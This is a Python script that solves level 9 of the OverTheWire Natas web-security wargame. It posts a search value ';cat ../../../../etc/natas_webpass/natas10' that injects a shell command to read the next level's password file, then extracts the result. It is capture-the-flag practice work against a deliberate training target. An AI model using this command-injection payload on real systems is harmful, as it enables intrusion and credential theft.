import requests
import re

userName = 'natas9'
url = f'http://{userName}.natas.labs.overthewire.org/'
fileContent = open('C:\\Users\\niroj\\Documents\\Natas\\password.txt')
password = fileContent.readlines()[8][8:40]

response = requests.get(url, auth = (userName, password))
htmlDoc = response.text
# print(htmlDoc)

response = requests.get(url + "index-source.html", auth = (userName, password))
htmlDoc = response.text
# print(htmlDoc)

data = {
    'needle': ';cat ../../../../etc/natas_webpass/natas10',
    'submit': 'Search'
}

response = requests.post(url, auth = (userName, password), data = data)
htmlDoc = response.text
# print(htmlDoc)

print(re.findall("/natas(.*)", htmlDoc))

try:
    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html', 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("Operation accomplished!")
except IOError as e:
    print(f"Error appear{e}")

# run the command and the password will be appear in index.html